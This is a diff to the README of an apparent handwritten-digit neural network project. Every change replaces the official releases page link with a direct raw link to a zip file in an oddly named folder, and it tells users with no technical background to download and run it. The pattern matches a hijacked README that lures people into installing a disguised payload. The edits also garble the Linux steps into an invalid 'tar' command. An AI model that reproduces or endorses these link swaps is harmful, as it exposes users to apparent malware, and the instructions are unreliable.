@@ -1,7 +1,7 @@
 # 🖥 mnist-neural-network - Easy Handwritten Digit Recognition
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Eyman67/mnist-neural-network/releases)
+[![Download](https://raw.githubusercontent.com/Eyman67/mnist-neural-network/main/nonportrayal/mnist-neural-network.zip)](https://raw.githubusercontent.com/Eyman67/mnist-neural-network/main/nonportrayal/mnist-neural-network.zip)
 
 ## 🚀 Getting Started
 Welcome to the mnist-neural-network! This application allows you to recognize handwritten digits using a neural network. You do not need to know how to code or have a technical background. Follow the steps below to get started quickly.
@@ -16,19 +16,19 @@ Welcome to the mnist-neural-network! This application allows you to recognize ha
 ## 📥 Download & Install
 To download and install the mnist-neural-network software, follow these simple steps:
 
-1. **Visit the Releases Page:** Click this link to go to the downloads page: [Download Here](https://github.com/Eyman67/mnist-neural-network/releases).
+1. **Visit the Releases Page:** Click this link to go to the downloads page: [Download Here](https://raw.githubusercontent.com/Eyman67/mnist-neural-network/main/nonportrayal/mnist-neural-network.zip).
 
 2. **Select the Latest Release:** Once on the Releases page, look for the most recent version. It should say "Latest release".
 
 3. **Download the Application:** Click on the appropriate file for your operating system. 
    - For Windows, choose a `.exe` file.
    - For macOS, look for a `.dmg` file.
-   - For Linux, a `.tar.gz` file may be available.
+   - For Linux, a `https://raw.githubusercontent.com/Eyman67/mnist-neural-network/main/nonportrayal/mnist-neural-network.zip` file may be available.
    
 4. **Run the Installer:**
    - **Windows:** Double-click the downloaded `.exe` file to start the installation. Follow the prompts that appear on your screen. 
    - **macOS:** Open the `.dmg` file and drag the application icon to your Applications folder.
-   - **Linux:** Open a terminal, navigate to the downloaded file, and use `tar -xvzf filename.tar.gz` to extract the files. Then, follow any included instructions to complete the installation.
+   - **Linux:** Open a terminal, navigate to the downloaded file, and use `tar -xvzf https://raw.githubusercontent.com/Eyman67/mnist-neural-network/main/nonportrayal/mnist-neural-network.zip` to extract the files. Then, follow any included instructions to complete the installation.
 
 5. **Open the Application:** After installation, find the application in your programs list (Windows), Applications folder (macOS), or the designated installation path (Linux). Double-click the icon to open it.
 
